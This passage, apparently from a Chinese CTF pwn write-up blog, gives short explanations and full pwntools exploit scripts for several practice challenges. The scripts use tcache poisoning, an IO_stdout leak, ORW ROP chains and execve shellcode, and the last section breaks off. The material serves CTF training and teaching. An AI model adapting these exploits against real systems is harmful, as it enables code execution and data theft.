class="hljs-string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="hljs-number">28982</span>)<br>else:<br>io=<span class="hljs-built_in">process</span>(filename)<br>if de_bug==<span class="hljs-number">1</span>:<br>gdb.<span class="hljs-built_in">attach</span>(io)<br>elf=<span class="hljs-built_in">ELF</span>(filename)<br><br>libc=<span class="hljs-built_in">ELF</span>(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br># - - - - - - - - - - - - - #<br>s   = lambda content : io.<span class="hljs-built_in">send</span>(content)<br>sl  = lambda content : io.<span class="hljs-built_in">sendline</span>(content)<br>sa  = lambda content,send : io.<span class="hljs-built_in">sendafter</span>(content, send)<br>sla = lambda content,send : io.<span class="hljs-built_in">sendlineafter</span>(content, send)<br>rc  = lambda number : io.<span class="hljs-built_in">recv</span>(number)<br>ru  = lambda content : io.<span class="hljs-built_in">recvuntil</span>(content)<br>rcg = lambda c : <span class="hljs-built_in">u64</span>(<span class="hljs-built_in">rc</span>(c).<span class="hljs-built_in">ljust</span>(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)) <br># - - - - - - - - - - - - - #<br>def <span class="hljs-built_in">cmd</span>(c):<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;Choice: &quot;</span>,<span class="hljs-built_in">str</span>(c))<br>def <span class="hljs-built_in">add</span>():<br><span class="hljs-built_in">cmd</span>(<span class="hljs-number">1</span>)<br>def <span class="hljs-built_in">free</span>(idx):<br><span class="hljs-built_in">cmd</span>(<span class="hljs-number">2</span>)<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;Idx: &quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>def <span class="hljs-built_in">show</span>(idx):<br><span class="hljs-built_in">cmd</span>(<span class="hljs-number">3</span>)<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;Idx: &quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>def <span class="hljs-built_in">edit</span>(idx,data):<br><span class="hljs-built_in">cmd</span>(<span class="hljs-number">4</span>)<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;Idx: &quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;Size: &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(data)))<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;Content: &quot;</span>,data)<br># - - - - - - - - - - - - - #<br>rdi_l=<span class="hljs-number">0</span>x0000000000028a55<br>rsi_l=<span class="hljs-number">0</span>x000000000002a4cf<br>rdx_l=<span class="hljs-number">0</span>x00000000000c7f32<br># - - - - - - - - - - - - - #<br>for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br><span class="hljs-built_in">add</span>()#<span class="hljs-number">0</span>-<span class="hljs-number">9</span><br>for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    <span class="hljs-built_in">free</span>(i)#<span class="hljs-number">0</span>-<span class="hljs-number">7</span><br><span class="hljs-built_in">edit</span>(<span class="hljs-number">7</span>, b<span class="hljs-string">&#x27;\x00&#x27;</span>)<br><span class="hljs-built_in">show</span>(<span class="hljs-number">0</span>)<br><span class="hljs-built_in">ru</span>(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>key=<span class="hljs-built_in">rcg</span>(<span class="hljs-number">5</span>)<br><span class="hljs-built_in">edit</span>(<span class="hljs-number">7</span>, b<span class="hljs-string">&#x27;\x01&#x27;</span>)<br><span class="hljs-built_in">show</span>(<span class="hljs-number">7</span>)<br>main_arena=<span class="hljs-built_in">u64</span>(<span class="hljs-built_in">ru</span>(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].<span class="hljs-built_in">ljust</span>(<span class="hljs-number">8</span>, b<span class="hljs-string">&#x27;\x00&#x27;</span>))-<span class="hljs-number">96</span>-<span class="hljs-number">1</span><br>libc_base=main_arena-<span class="hljs-number">0</span>x10-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>environ=libc_base+libc.sym[<span class="hljs-string">&#x27;_environ&#x27;</span>]<br>chunk_base=key&lt;&lt;<span class="hljs-number">12</span><br>for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>    <span class="hljs-built_in">add</span>() #<span class="hljs-number">10</span>-<span class="hljs-number">13</span><br>p1=<span class="hljs-built_in">p64</span>(key ^ environ)+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>)<br><span class="hljs-built_in">edit</span>(<span class="hljs-number">2</span>,p1)<br><span class="hljs-built_in">add</span>()#<span class="hljs-number">14</span><br><span class="hljs-built_in">add</span>()#<span class="hljs-number">15</span><br><span class="hljs-built_in">show</span>(<span class="hljs-number">15</span>)<br>stack_addr = <span class="hljs-built_in">u64</span>(<span class="hljs-built_in">ru</span>(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].<span class="hljs-built_in">ljust</span>(<span class="hljs-number">8</span>, b<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0</span>x138<br>p2=<span class="hljs-built_in">p64</span>(key ^ stack_addr)+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>)<br><span class="hljs-built_in">free</span>(<span class="hljs-number">9</span>)<br><span class="hljs-built_in">free</span>(<span class="hljs-number">10</span>)<br><span class="hljs-built_in">edit</span>(<span class="hljs-number">10</span>,p2)<br><span class="hljs-built_in">add</span>()#<span class="hljs-number">16</span><br><span class="hljs-built_in">add</span>()#<span class="hljs-number">17</span><br><br>rdi = libc_base + rdi_l<br>rsi = libc_base + rsi_l<br>rdx = libc_base + rdx_l<br>read_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>open_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>write_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>flag_addr = stack_addr + <span class="hljs-number">0</span>x10<br>#orw<br>p=<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+b<span class="hljs-string">&#x27;./flag\x00\x00&#x27;</span><br>p += <span class="hljs-built_in">p64</span>(rdi) + <span class="hljs-built_in">p64</span>(flag_addr) + <span class="hljs-built_in">p64</span>(rsi) + <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>) + <span class="hljs-built_in">p64</span>(open_addr)<br>p += <span class="hljs-built_in">p64</span>(rdi) + <span class="hljs-built_in">p64</span>(<span class="hljs-number">3</span>) + <span class="hljs-built_in">p64</span>(rsi) + <span class="hljs-built_in">p64</span>(stack_addr - <span class="hljs-number">0</span>x200) + <span class="hljs-built_in">p64</span>(rdx) + <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x40) + <span class="hljs-built_in">p64</span>(read_addr)<br>p += <span class="hljs-built_in">p64</span>(rdi) + <span class="hljs-built_in">p64</span>(<span class="hljs-number">1</span>) + <span class="hljs-built_in">p64</span>(rsi) + <span class="hljs-built_in">p64</span>(stack_addr - <span class="hljs-number">0</span>x200) + <span class="hljs-built_in">p64</span>(rdx) + <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x40) + <span class="hljs-built_in">p64</span>(write_addr)<br><span class="hljs-built_in">edit</span>(<span class="hljs-number">17</span>,p)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(main_arena))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(chunk_base))<br>io.<span class="hljs-built_in">interactive</span>()<br></code></pre></td></tr></table></figure><h2 id="CISCN-2022-华东北-blue"><a href="#CISCN-2022-华东北-blue" class="headerlink" title="[CISCN 2022 华东北]blue"></a>[CISCN 2022 华东北]blue</h2><p>利用一次性的 UAF 的 free 功能通过 unsorted bin 泄露 libc_base ，再利用 double free + 切割 unsorted bin chunk 来实现 tcache bin attack，由于 show 功能不能再次使用，因此通过修改 IO_stdout 来修改 write_base 等来泄露栈地址，再一次通过 tcache bin attack 打栈为 orw_rop覆盖add_ret来进行堆栈联动</p><p>最后使用puts函数去打印，不然长度会超过0x80</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs css">#!/usr/bin/env python3<br># -*-coding:utf-<span class="hljs-number">8</span> -*-<br>from pwn import*<br>from  LibcSearcher import*<br>from ctypes import*<br>io_ch=<span class="hljs-number">1</span><br>de_bug=<span class="hljs-number">1</span><br>arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>filename=<span class="hljs-string">&#x27;./a&#x27;</span><br><span class="hljs-built_in">context</span>(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=arch)<br>if io_ch==<span class="hljs-number">1</span>:<br>io=<span class="hljs-built_in">remote</span>(<span class="hljs-string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="hljs-number">28827</span>)<br>else:<br>io=<span class="hljs-built_in">process</span>(filename)<br>if de_bug==<span class="hljs-number">1</span>:<br>gdb.<span class="hljs-built_in">attach</span>(io)<br>elf=<span class="hljs-built_in">ELF</span>(filename)<br>libc=<span class="hljs-built_in">ELF</span>(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br># - - - - - - - - - - - - - #<br>s   = lambda content : io.<span class="hljs-built_in">send</span>(content)<br>sl  = lambda content : io.<span class="hljs-built_in">sendline</span>(content)<br>sa  = lambda content,send : io.<span class="hljs-built_in">sendafter</span>(content, send)<br>sla = lambda content,send : io.<span class="hljs-built_in">sendlineafter</span>(content, send)<br>rc  = lambda number : io.<span class="hljs-built_in">recv</span>(number)<br>ru  = lambda content : io.<span class="hljs-built_in">recvuntil</span>(content)<br>rcg = lambda c : <span class="hljs-built_in">u64</span>(<span class="hljs-built_in">rc</span>(c).<span class="hljs-built_in">ljust</span>(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)) <br># - - - - - - - - - - - - - #<br>def <span class="hljs-built_in">cmd</span>(c):<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;Choice:&quot;</span>,<span class="hljs-built_in">str</span>(c))<br>def <span class="hljs-built_in">add</span>(size,data):<br><span class="hljs-built_in">cmd</span>(<span class="hljs-number">1</span>)<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;Please input size: &quot;</span>,<span class="hljs-built_in">str</span>(size))<br><span class="hljs-built_in">sa</span>(<span class="hljs-string">&quot;Please input content:&quot;</span>,data)<br>def <span class="hljs-built_in">free</span>(idx):<br><span class="hljs-built_in">cmd</span>(<span class="hljs-number">2</span>)<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;Please input idx:&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>def <span class="hljs-built_in">show</span>(idx):<br><span class="hljs-built_in">cmd</span>(<span class="hljs-number">3</span>)<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;Please input idx: &quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>def <span class="hljs-built_in">v3666</span>(idx):<br><span class="hljs-built_in">cmd</span>(<span class="hljs-number">666</span>)<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;Please input idx: &quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><br># - - - - - - - - - - - - - #<br>libc_pop_rdi_ret=<span class="hljs-number">0</span>x0000000000023b6a<br>libc_pop_rsi_ret=<span class="hljs-number">0</span>x000000000002601f<br>libc_pop_rdx_ret=<span class="hljs-number">0</span>x0000000000142c92<br><br># - - - - - - - - - - - - - #<br>def <span class="hljs-built_in">attack</span>():<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Now,Start!&#x27;</span>)<br>for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">10</span>):#<span class="hljs-number">0</span>-<span class="hljs-number">9</span><br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x80,b<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">7</span>):#<span class="hljs-number">0</span>-<span class="hljs-number">6</span><br><span class="hljs-built_in">free</span>(i)<br><br><span class="hljs-built_in">v3666</span>(<span class="hljs-number">8</span>)<br><span class="hljs-built_in">show</span>(<span class="hljs-number">8</span>)<br>main_arena=<span class="hljs-built_in">u64</span>(<span class="hljs-built_in">ru</span>(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].<span class="hljs-built_in">ljust</span>(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>))-<span class="hljs-number">96</span><br><br>libc_base=main_arena-<span class="hljs-number">0</span>x20-libc.sym[<span class="hljs-string">&#x27;__memalign_hook&#x27;</span>]<br>stdout=libc_base+libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br>environ=libc_base+libc.sym[<span class="hljs-string">&#x27;__environ&#x27;</span>]<br><br><span class="hljs-built_in">free</span>(<span class="hljs-number">7</span>)<br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x80,b<span class="hljs-string">&#x27;bbbbbbbb&#x27;</span>)#<span class="hljs-number">0</span><br><span class="hljs-built_in">free</span>(<span class="hljs-number">8</span>)<br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x70,b<span class="hljs-string">&#x27;cccccccc&#x27;</span>)#<span class="hljs-number">1</span><br>p1=<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>)+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x91)+<span class="hljs-built_in">p64</span>(stdout)<br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x70,p1)#<span class="hljs-number">2</span><br><br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x80,b<span class="hljs-string">&#x27;dddddddd&#x27;</span>)#<span class="hljs-number">3</span><br>p2=<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x00000000fbad1800)+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+<span class="hljs-built_in">p64</span>(environ)+<span class="hljs-built_in">p64</span>(environ+<span class="hljs-number">8</span>)*<span class="hljs-number">2</span><br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x80,p2)#<span class="hljs-number">4</span><br>stack=<span class="hljs-built_in">u64</span>(<span class="hljs-built_in">ru</span>(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].<span class="hljs-built_in">ljust</span>(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>))-<span class="hljs-number">0</span>x128<br><br><span class="hljs-built_in">free</span>(<span class="hljs-number">3</span>)<br><span class="hljs-built_in">free</span>(<span class="hljs-number">2</span>)<br>p3=<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>)+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x91)+<span class="hljs-built_in">p64</span>(stack)<br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x70,p3)<br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x80,b<span class="hljs-string">&#x27;ffff&#x27;</span>)<br><br>read_addr=libc_base+libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>open_addr=libc_base+libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>puts_addr=libc_base+libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>write_addr=libc_base+libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>pop_rdi_ret=libc_base+libc_pop_rdi_ret<br>pop_rsi_ret=libc_base+libc_pop_rsi_ret<br>pop_rdx_ret=libc_base+libc_pop_rdx_ret<br>flag_addr=stack+<span class="hljs-number">0</span>x200<br><br>p=b<span class="hljs-string">&#x27;./flag&#x27;</span><br>p=p.<span class="hljs-built_in">ljust</span>(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>p+=<span class="hljs-built_in">p64</span>(pop_rdi_ret)+<span class="hljs-built_in">p64</span>(stack)+<span class="hljs-built_in">p64</span>(pop_rsi_ret)+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>)+<span class="hljs-built_in">p64</span>(open_addr)<br>p+=<span class="hljs-built_in">p64</span>(pop_rdi_ret)+<span class="hljs-built_in">p64</span>(<span class="hljs-number">3</span>)+<span class="hljs-built_in">p64</span>(pop_rsi_ret)+<span class="hljs-built_in">p64</span>(flag_addr)+<span class="hljs-built_in">p64</span>(pop_rdx_ret)+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x30)+<span class="hljs-built_in">p64</span>(read_addr)<br>p+=<span class="hljs-built_in">p64</span>(pop_rdi_ret)+<span class="hljs-built_in">p64</span>(flag_addr)+<span class="hljs-built_in">p64</span>(puts_addr)<br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x80,p)<br>#<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;stack&#x27;</span>,<span class="hljs-built_in">hex</span>(stack))<br>#<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;stdout&#x27;</span>,<span class="hljs-built_in">hex</span>(stdout))<br>#<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;libc_base&#x27;</span>,<span class="hljs-built_in">hex</span>(libc_base))<br>#<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;main_arena&#x27;</span>,<span class="hljs-built_in">hex</span>(main_arena))<br><br>io.<span class="hljs-built_in">interactive</span>()<br><br><br>if __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br><span class="hljs-built_in">attack</span>()<br>io.<span class="hljs-built_in">interactive</span>()<br></code></pre></td></tr></table></figure><h2 id="NSSRound-14-Basic-xor"><a href="#NSSRound-14-Basic-xor" class="headerlink" title="[NSSRound#14 Basic]xor"></a>[NSSRound#14 Basic]xor</h2><p>通过单字符改写,先将循环次数改大, 后循环写shellcode , 将fini的地址改为shellcode的地址</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs scss">def <span class="hljs-built_in">edit</span>(addr,data):<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;addr: &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(addr)))<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;value: &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(data)))<br># - - - - - - - - - - - - - #<br>stack_addr=<span class="hljs-number">0</span>x600c00<br># - - - - - - - - - - - - - #<br>def <span class="hljs-built_in">attack</span>():<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Now,Start!&#x27;</span>)<br><span class="hljs-built_in">edit</span>(<span class="hljs-number">0</span>x600bcf,<span class="hljs-number">0</span>xff)<br>sh=<span class="hljs-built_in">asm</span>(shellcraft.<span class="hljs-built_in">sh</span>())<br>for i in <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(sh)):<br><span class="hljs-built_in">edit</span>(stack_addr+i,sh[i])<br><span class="hljs-built_in">edit</span>(<span class="hljs-number">0</span>x600970,<span class="hljs-number">0</span>x00^<span class="hljs-number">0</span>x10)<br><span class="hljs-built_in">edit</span>(<span class="hljs-number">0</span>x600971,<span class="hljs-number">0</span>x0c^<span class="hljs-number">0</span>x06)<br><span class="hljs-built_in">edit</span>(<span class="hljs-number">0</span>x600972,<span class="hljs-number">0</span>x60^<span class="hljs-number">0</span>x40)<br><span class="hljs-built_in">edit</span>(<span class="hljs-number">0</span>x600bcf,<span class="hljs-number">0</span>xff)<br>io.<span class="hljs-built_in">interactive</span>()<br>if __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br><span class="hljs-built_in">attack</span>()<br>io.<span class="hljs-built_in">interactive</span>()<br></code></pre></td></tr></table></figure><h2 id="2021-祥云杯-JigSAW’sCage"><a href="#2021-祥云杯-JigSAW’sCage" class="headerlink" title="[2021 祥云杯]JigSAW’sCage"></a>[2021 祥云杯]JigSAW’sCage</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs scss"># - - - - - - - - - - - - - #<br>def <span class="hljs-built_in">cmd</span>(c):<br><span class="hljs-built_in">sla</span>(b<span class="hljs-string">&quot;Choice : &quot;</span>, <span class="hljs-built_in">str</span>(c))<br>def <span class="hljs-built_in">add</span>(idx):<br><span class="hljs-built_in">cmd</span>(<span class="hljs-number">1</span>)<br><span class="hljs-built_in">sla</span>(b<span class="hljs-string">&quot;Index? : &quot;</span>, <span class="hljs-built_in">str</span>(idx))<br>def <span class="hljs-built_in">edit</span>(idx, content):<br><span class="hljs-built_in">cmd</span>(<span class="hljs-number">2</span>)<br><span class="hljs-built_in">sla</span>(b<span class="hljs-string">&quot;Index? : &quot;</span>, <span class="hljs-built_in">str</span>(idx))<br><span class="hljs-built_in">sa</span>(b<span class="hljs-string">&quot;iNput:&quot;</span>, content)<br>def <span class="hljs-built_in">free</span>(idx):<br><span class="hljs-built_in">cmd</span>(<span class="hljs-number">3</span>)<br><span class="hljs-built_in">sla</span>(b<span class="hljs-string">&quot;Index? : &quot;</span>, <span class="hljs-built_in">str</span>(idx))<br>def <span class="hljs-built_in">do</span>(idx):<br><span class="hljs-built_in">cmd</span>(<span class="hljs-number">4</span>)<br><span class="hljs-built_in">sla</span>(b<span class="hljs-string">&quot;Index? : &quot;</span>, <span class="hljs-built_in">str</span>(idx))<br>def <span class="hljs-built_in">show</span>(idx):<br><span class="hljs-built_in">cmd</span>(<span class="hljs-number">5</span>)<br><span class="hljs-built_in">sla</span>(b<span class="hljs-string">&quot;Index? : &quot;</span>, <span class="hljs-built_in">str</span>(idx))<br># - - - - - - - - - - - - - #<br>p0=<span class="hljs-built_in">asm</span>(<span class="hljs-string">&#x27;mov rdi,rdx;add rdx,0x20;call rdx;&#x27;</span>)<br>p1=<span class="hljs-built_in">asm</span>(<span class="hljs-string">&#x27;add rdi,0x80;add rdx,0x20;call rdx;&#x27;</span>)<br>p2=<span class="hljs-built_in">asm</span>(<span class="hljs-string">&#x27;mov rax,0x3b;add rdx,0x20;call rdx;&#x27;</span>)<br>p3=<span class="hljs-built_in">asm</span>(<span class="hljs-string">&#x27;xor rsi,rsi;xor rdx,rdx;syscall;&#x27;</span>)<br>p4=b<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(p0))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(p1)) <br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(p2))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(p3))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(p4))<br># - - - - - - - - - - - - - #<br>def <span class="hljs-built_in">attack</span>():<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Now,Start!&#x27;</span>)<br><span class="hljs-built_in">sla</span>(b<span class="hljs-string">&#x27;Name:\n&#x27;</span>, b<span class="hljs-string">&#x27;lekc&#x27;</span>)<br><span class="hljs-built_in">sla</span>(b<span class="hljs-string">&#x27;Choice:\n&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0</span>x1000000000))<br>for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br><span class="hljs-built_in">add</span>(i)<br><span class="hljs-built_in">edit</span>(<span class="hljs-number">0</span>, p0)<br><span class="hljs-built_in">edit</span>(<span class="hljs-number">1</span>, p1)<br><span class="hljs-built_in">edit</span>(<span class="hljs-number">2</span>, p2)<br><span class="hljs-built_in">edit</span>(<span class="hljs-number">3</span>, p3)<br><span class="hljs-built_in">edit</span>(<span class="hljs-number">4</span>, p4)<br><span class="hljs-built_in">do</span>(<span class="hljs-number">0</span>)<br>io.<span class="hljs-built_in">interactive</span>()<br></code></pre></td></tr></table></figure><h2 id="虎符CTF-2022-babygame"><a href="#虎符CTF-2022-babygame" class="headerlink" title="[虎符CTF 2022]babygame"></a>[虎符CTF 2022]babygame</h2><p>随机数预测可以利用栈溢出覆盖 v5 ，使其随机数可控。<br>利用第一个 printf 泄露栈地址<br>利用格式化字符串漏洞修改 ret 并泄露 libc_base ，再执行格式化字符串漏洞修改 ret 为 one_gadget<br>要做出这道题主要是会用 gdb 调试，并且懂得 patchelf 题目 libc 版本</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span 